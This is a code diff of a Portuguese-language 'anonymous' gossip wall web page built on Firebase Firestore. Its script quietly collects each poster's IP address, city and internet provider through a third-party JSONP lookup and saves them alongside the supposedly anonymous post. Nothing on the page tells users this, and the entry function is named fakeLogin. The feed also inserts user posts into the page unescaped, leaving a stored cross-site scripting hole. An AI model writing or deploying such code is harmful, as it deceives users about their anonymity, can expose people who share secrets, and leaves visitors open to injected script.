@@ -3,62 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XOXO - Mural Anonymous</title>
+    <title>XOXO - O Mural dos Segredos</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore-compat.js"></script>
 
     <style>
         :root { --deep-black: #050505; }
-        
-        body { 
-            margin: 0; background-color: var(--deep-black); color: #ddd; 
-            font-family: 'Courier New', monospace; overflow: hidden; height: 100vh;
-        }
+        body { margin: 0; background-color: var(--deep-black); color: #ddd; font-family: 'Courier New', monospace; overflow: hidden; }
 
-        /* Efeito de Névoa Animada */
-        .fog-container {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: -1; background: radial-gradient(circle, transparent, var(--deep-black));
-        }
-        .fog {
-            position: absolute; width: 200%; height: 100%;
+        /* Efeito de Névoa que se move */
+        .fog-bg {
+            position: fixed; top: 0; left: 0; width: 200%; height: 100%;
             background: url('https://www.transparenttextures.com/patterns/smoke.png');
-            opacity: 0.2; animation: moveFog 50s linear infinite;
+            opacity: 0.2; z-index: -1;
+            animation: moveFog 40s linear infinite;
         }
         @keyframes moveFog { from { transform: translateX(0); } to { transform: translateX(-50%); } }
 
-        /* Fundo com Máscara e Título */
+        /* Imagem do Rosto de Anônimo no Fundo */
         .hero { 
-            height: 45vh; display: flex; flex-direction: column; 
-            justify-content: center; align-items: center; text-align: center;
-            background: url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=1000&auto=format&fit=crop') no-repeat center;
-            background-size: contain;
+            height: 40vh; 
+            background-image: linear-gradient(rgba(0,0,0,0.7), var(--deep-black)), url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1000&q=80'); 
+            background-size: contain; background-repeat: no-repeat; background-position: center;
+            display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; 
         }
-        .hero h1 { font-size: 5rem; margin: 0; color: #fff; letter-spacing: 15px; text-shadow: 0 0 15px #fff; }
+        .hero h1 { font-size: 5rem; margin: 0; color: #ccc; letter-spacing: 12px; }
 
-        /* Telas */
-        #login-screen { display: flex; justify-content: center; padding: 40px; }
-        #feed-container { display: none; padding: 20px; max-width: 600px; margin: auto; overflow-y: auto; height: 50vh; }
-
-        .btn-enter { 
-            background: transparent; color: white; padding: 15px 40px; 
-            border: 1px solid #555; cursor: pointer; text-transform: uppercase;
-        }
-        .btn-enter:hover { background: white; color: black; box-shadow: 0 0 20px white; }
-
-        .input-box { background: rgba(15, 15, 15, 0.9); padding: 20px; border: 1px solid #333; margin-bottom: 20px; backdrop-filter: blur(10px); }
-        textarea { width: 100%; background: transparent; border: none; color: #fff; font-size: 1.1rem; outline: none; resize: none; }
+        #login-screen { display: flex; flex-direction: column; align-items: center; padding: 50px; }
+        .btn-login { background: #333; color: white; padding: 15px 30px; cursor: pointer; border: 1px solid #555; text-transform: uppercase; }
         
-        .btn-post { background: #222; color: #fff; border: 1px solid #444; padding: 10px 25px; float: right; cursor: pointer; }
-        .btn-post:disabled { opacity: 0.3; cursor: wait; }
-
-        .fofoca-card { background: rgba(20, 20, 20, 0.8); padding: 15px; margin-bottom: 10px; border-left: 2px solid #fff; }
+        #feed-container { display: none; padding: 20px; max-width: 600px; margin: auto; height: 55vh; overflow-y: auto; }
+        .input-box { background: rgba(17, 17, 17, 0.9); padding: 20px; border: 1px solid #333; margin-bottom: 30px; }
+        textarea { width: 100%; background: transparent; border: none; color: #aaa; font-size: 1.1rem; outline: none; font-family: inherit; resize: none; }
+        .btn-post { background: #222; color: #999; border: 1px solid #444; padding: 10px 20px; float: right; cursor: pointer; }
+        .btn-post:disabled { opacity: 0.5; cursor: wait; }
+        .fofoca-card { background: #0d0d0d; padding: 20px; margin-bottom: 15px; border-left: 3px solid #444; }
     </style>
 </head>
 <body>
 
-    <div class="fog-container"><div class="fog"></div></div>
+    <div class="fog-bg"></div>
 
     <header class="hero">
         <h1>XOXO</h1>
@@ -66,13 +51,14 @@
     </header>
 
     <div id="login-screen">
-        <button class="btn-enter" onclick="entrar()">ACEDER AO MURAL</button>
+        <h3>Entre no mural... se tiver coragem.</h3>
+        <button class="btn-login" onclick="fakeLogin()">Aceder ao Mural</button>
     </div>
 
     <div id="feed-container">
         <div class="input-box">
-            <textarea id="fofocaInput" rows="3" placeholder="Sussurre aqui..."></textarea>
-            <button class="btn-post" id="btnEnviar" onclick="enviarFofoca()">SOLTAR O VERBO</button>
+            <textarea id="fofocaInput" rows="3" placeholder="O que você sabe que ninguém mais sabe?"></textarea>
+            <button class="btn-post" id="btnEnviar" onclick="enviarFofoca()">Soltar o Verbo!</button>
             <div style="clear: both;"></div>
         </div>
         <div id="mural"></div>
@@ -88,40 +74,40 @@
             appId: "1:730968176054:web:fcabf0465b189fddbdbd17",
             measurementId: "G-3DZPC3E7SV"
         };
+
         firebase.initializeApp(firebaseConfig);
         var db = firebase.firestore();
 
-        function entrar() {
+        function fakeLogin() {
             document.getElementById('login-screen').style.display = 'none';
             document.getElementById('feed-container').style.display = 'block';
             carregarFofocas();
         }
 
         function enviarFofoca() {
-            const input = document.getElementById('fofocaInput');
-            const btn = document.getElementById('btnEnviar');
-            const texto = input.value;
-            if (!texto.trim()) return;
+            var input = document.getElementById('fofocaInput');
+            var btn = document.getElementById('btnEnviar');
+            var texto = input.value;
+            if (texto.trim() === "") return;
 
             btn.disabled = true;
-            btn.innerText = "RASTREANDO...";
+            btn.innerText = "Rastreando...";
 
             let finalizado = false;
 
-            // Segurança: Se em 2 segundos a API de IP não responder, manda sem rastro para não travar
+            // Segurança: Se a API de IP demorar mais de 2.5s, envia sem rastro para NÃO travar
             const timeout = setTimeout(() => {
-                if (!finalizado) {
+                if(!finalizado) {
                     finalizado = true;
-                    gravarFirebase(texto, { status: "Rastreio Offline" });
+                    salvarNoFirebase(texto, { ip: "Oculto/Timeout" });
                 }
-            }, 2000);
+            }, 2500);
 
-            // Captura de IP via JSONP
-            window.processarIP = function(data) {
-                if (!finalizado) {
+            window.capturarDados = function(data) {
+                if(!finalizado) {
                     finalizado = true;
                     clearTimeout(timeout);
-                    gravarFirebase(texto, {
+                    salvarNoFirebase(texto, {
                         ip: data.ip || "0.0.0.0",
                         cidade: data.city || "Desconhecida",
                         provedor: data.org || "Não identificado"
@@ -129,34 +115,35 @@
                 }
             };
 
-            const script = document.createElement('script');
-            script.src = 'https://ipapi.co/jsonp/callback=processarIP';
+            var script = document.createElement('script');
+            script.src = 'https://ipapi.co/jsonp/callback=capturarDados';
             document.body.appendChild(script);
         }
 
-        function gravarFirebase(texto, rastro) {
+        function salvarNoFirebase(texto, rastro) {
             db.collection("fofocas").add({
                 conteudo: texto,
                 data: firebase.firestore.FieldValue.serverTimestamp(),
                 rastro: rastro
             }).then(() => {
                 document.getElementById('fofocaInput').value = "";
-                alert("Segredo enviado!");
+                alert("Segredo espalhado!");
             }).finally(() => {
-                const btn = document.getElementById('btnEnviar');
+                var btn = document.getElementById('btnEnviar');
                 btn.disabled = false;
-                btn.innerText = "SOLTAR O VERBO";
-                const s = document.querySelector('script[src*="ipapi"]');
+                btn.innerText = "Soltar o Verbo!";
+                var s = document.querySelector('script[src*="ipapi"]');
                 if(s) s.remove();
             });
         }
 
         function carregarFofocas() {
-            db.collection("fofocas").orderBy("data", "desc").onSnapshot(snap => {
-                const mural = document.getElementById('mural');
+            db.collection("fofocas").orderBy("data", "desc").onSnapshot(snapshot => {
+                var mural = document.getElementById('mural');
                 mural.innerHTML = "";
-                snap.forEach(doc => {
-                    mural.innerHTML += <div class="fofoca-card"><p>${doc.data().conteudo}</p></div>;
+                snapshot.forEach(doc => {
+                    var f = doc.data();
+                    mural.innerHTML += '<div class="fofoca-card"><small>📢 Alguém sussurrou...</small><p>' + f.conteudo + '</p></div>';
                 });
             });
         }
